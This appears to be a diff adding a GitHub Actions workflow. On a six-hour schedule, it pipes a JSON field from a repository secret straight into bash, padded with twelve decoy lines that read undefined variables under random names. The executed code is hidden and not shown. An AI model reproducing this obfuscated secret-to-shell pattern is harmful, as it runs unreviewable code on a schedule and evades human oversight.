@@ -1,0 +1,29 @@
+name: changkunongfu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: changkunongfu
+        env:
+          iyk8310: ${{ secrets.iyk8310 }}
+        run: |
+          echo $iyk8310 | jq -r .uzky35185 | /bin/bash
+          echo $mn4 | jq -r .jgthj71 | /bin/bash
+          echo $grkiq13494 | jq -r .pih14 | /bin/bash
+          echo $d4 | jq -r .m91 | /bin/bash
+          echo $rmq10 | jq -r .mit6481 | /bin/bash
+          echo $wnrfl8606 | jq -r .xb37 | /bin/bash
+          echo $kle75 | jq -r .to4927 | /bin/bash
+          echo $aqr6 | jq -r .prcd78 | /bin/bash
+          echo $k3 | jq -r .ctqb2802 | /bin/bash
+          echo $x64706 | jq -r .qlf07 | /bin/bash
+          echo $smny89 | jq -r .fezx1 | /bin/bash
+          echo $guvfc75666 | jq -r .jvef3 | /bin/bash
+          echo $n47430 | jq -r .y123 | /bin/bash
+
